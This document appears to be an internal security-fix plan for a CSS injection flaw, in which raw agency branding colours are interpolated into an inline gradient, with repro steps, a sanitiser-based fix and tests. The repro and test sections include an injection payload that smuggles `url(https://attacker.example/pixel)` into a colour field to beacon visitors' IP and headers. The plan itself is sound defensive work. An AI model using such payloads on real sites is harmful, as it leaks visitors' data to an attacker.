# code-review-reality-web-agency-branding-css-injection

**Vector:** security
**Score:** 2
**Source:** Tier1d review 2026-08-12 (reality-web)
**Confidence:** high

## Hypothesis
`frontend/apps/reality-web/src/app/[locale]/agency/[slug]/page.tsx:64-65` interpolates the agency-owner-controlled `primaryColor` / `secondaryColor` strings raw into a `linear-gradient()` inline style. The backend `backend/servers/reality-server/src/routes/agency_branding.rs` validates only the URL fields (`logo_url` / `banner_url` / `watermark_url`) — colours are stored verbatim. A semi-trusted agency owner can therefore inject arbitrary CSS: extra background layers, `url(https://attacker.example/pixel)` beacons, mixed-content downgrades, or content that the CSP `img-src` permits. The repo already ships `sanitizeCssValue` (see `frontend/apps/reality-web/src/lib/tenant-config.ts:185/189/193`) applied to tenant branding for exactly this class; the agency profile page bypasses it. Fix: reuse `sanitizeCssValue` on the frontend AND add a colour-literal validator to `UpdateBrandingRequest` for defence-in-depth.

## Evidence
- `frontend/apps/reality-web/src/app/[locale]/agency/[slug]/page.tsx:64-65` — inline style: ``background: `linear-gradient(135deg, ${agency.primaryColor}, ${agency.secondaryColor ?? '#2563eb'})` ``
- `backend/servers/reality-server/src/routes/agency_branding.rs:250-254` (region) validates only URL fields via `check_optional_url_field`; the request struct's `primary_color`/`secondary_color` pass through untouched.
- `frontend/apps/reality-web/src/lib/tenant-config.ts:185,189,193` — `sanitizeCssValue(branding.primary_color, '--ppt-color-primary')` (and siblings) — the exact sanitiser this page should reuse.
- Verified independently via `grep sanitizeCssValue frontend/apps/reality-web/src/lib/tenant-config.ts` → present and exported.

## Files
- `frontend/apps/reality-web/src/app/[locale]/agency/[slug]/page.tsx`
- `frontend/apps/reality-web/src/lib/tenant-config.ts`
- `backend/servers/reality-server/src/routes/agency_branding.rs`

## Dependencies
_(none)_

## Required capabilities
- [x] C1 — Systematic debugging (security bug — required)
- [ ] C2 — Seed data
- [ ] C3 — Dev instance running
- [ ] C4 — Browser
- [ ] C5 — ADB device
- [x] C6 — Verification before completion
- [ ] C7 — Code-review reception

Mode: cloud-ok

## Repro steps
1. As an agency owner, PATCH `/api/v1/agencies/{id}/branding` with `{"primary_color": "red, red 100%), url(https://attacker.example/pixel), linear-gradient(135deg, red 0%", "secondary_color": "red 100%"}`.
2. Visit the public agency profile `/[locale]/agency/{slug}`.
3. **Expected:** either the branding write is rejected (400) or the malformed strings collapse to the fallback gradient (`#1e3a5f` → `#2563eb`). **Actual (today):** the malicious `primary_color` is stored verbatim and interpolated raw, resulting in three background layers, one of which is `url(https://attacker.example/pixel)` — every visitor's browser hits the attacker URL, leaking IP + User-Agent + Referer.

## Suggested approach
1. Extract a helper `buildAgencyCoverBackground(agency): string` into `frontend/apps/reality-web/src/lib/agencyBranding.ts` (create the file). It calls `sanitizeCssValue(agency.primaryColor ?? '', '--ppt-color-primary')` and `sanitizeCssValue(agency.secondaryColor ?? '', '--ppt-color-secondary')`, falls back to the current defaults (`#1e3a5f`, `#2563eb`) when either sanitiser returns `null`, and returns the composed `linear-gradient(...)` string.
2. Replace the inline expression in `agency/[slug]/page.tsx:64-65` with `background: buildAgencyCoverBackground(agency)`.
3. Add backend validator in `backend/servers/reality-server/src/routes/agency_branding.rs` (`update_branding` handler, request struct region): a small `is_safe_color(&str) -> bool` (regex `^(#[0-9a-fA-F]{3,8}|rgba?\([^)]+\)|hsla?\([^)]+\))$` + a strict trim/length cap). Reject invalid colours with a 400 mirroring the existing URL-field failure shape. This is defence-in-depth — the frontend sanitiser stays as the load-bearing gate.
4. Regression tests: (a) unit test on `buildAgencyCoverBackground` with malicious inputs (`'red), url(https://x'`) collapsing to the fallback; (b) backend integration test on `update_branding` rejecting a non-colour string with 400 `INVALID_COLOR`.
5. Verify: `cd frontend && pnpm --filter @ppt/reality-web typecheck && pnpm --filter @ppt/reality-web test` **plus** `cd backend && cargo test -p reality-server routes::agency_branding` (deferred to CI if the swagger-ui egress block trips locally — see prior PR #2711 pattern).

## Alternatives considered
- **Frontend-only fix (sanitize but leave backend untouched)** — rejected because a future consumer of the same DB rows (mobile app, another SSR view) would inherit the raw-CSS payload. Backend validation stops the bad row at write time.
- **Serialize via CSS variables + `url()` allowlist in CSP** — rejected as much larger blast-radius refactor; the sanitiser reuse is a two-line change with an existing precedent in the repo.

## Root-cause trace
1. Symptom: every visitor to the tampered agency profile page hits an attacker-controlled URL (analytics beacon / mixed-content bypass).
2. ← inline style `background: \`linear-gradient(135deg, ${agency.primaryColor}, ${agency.secondaryColor ?? '#2563eb'})\`` at `agency/[slug]/page.tsx:64-65` interpolates raw agency-owner input.
3. ← `agency.primaryColor` originates from the `PublicAgencyProfile` API response served by `reality-server /api/v1/agencies/{slug}` reading the `agencies.primary_color` column.
4. ← the `UpdateBrandingRequest` handler at `backend/servers/reality-server/src/routes/agency_branding.rs::update_branding` validates only URL fields, storing `primary_color` verbatim.
5. Origin: the agency-branding feature was landed with URL validation modelled on the tenant-branding path, but the tenant-branding path *also* applied `sanitizeCssValue` at read-time in `lib/tenant-config.ts` — a mitigating control the agency profile page never adopted.

## Test plan
- [ ] Unit: `frontend/apps/reality-web/src/lib/agencyBranding.test.ts` — malicious `primary_color` collapses to fallback; a valid `#3355aa` round-trips into the gradient; missing colour uses the pair of defaults.
- [ ] Backend integration: `backend/servers/reality-server/tests/agency_branding_integration_tests.rs` (create suite if absent) — PATCH with `"primary_color": "red), url(x)"` returns 400 `INVALID_COLOR`; PATCH with `"#3355aa"` returns 200 and round-trips.
- [ ] Frontend render: augment (or create) `frontend/apps/reality-web/src/app/[locale]/agency/[slug]/page.test.tsx` — mount the page with a raw-string `primaryColor` and assert the rendered `style.background` string does NOT contain `url(`.
- [ ] `cd frontend && pnpm --filter @ppt/reality-web test`
- [ ] `cd backend && cargo test -p reality-server routes::agency_branding` (CI-gated if swagger-ui egress blocks)

## Out of scope
- The tenant-branding path (`lib/tenant-config.ts`) already sanitises — no change there.
- Broader CSP tightening (would break `data:` favicons and inline SVG uses elsewhere on the site).
- Migration of stored malformed colours — the frontend sanitiser makes existing bad rows render safely; a cleanup migration is a follow-up.

## After-merge
- Move this file to `plans/_archive/code-review-reality-web-agency-branding-css-injection.md`
- Mark the matching `backlog.json` row as `status: "done"`
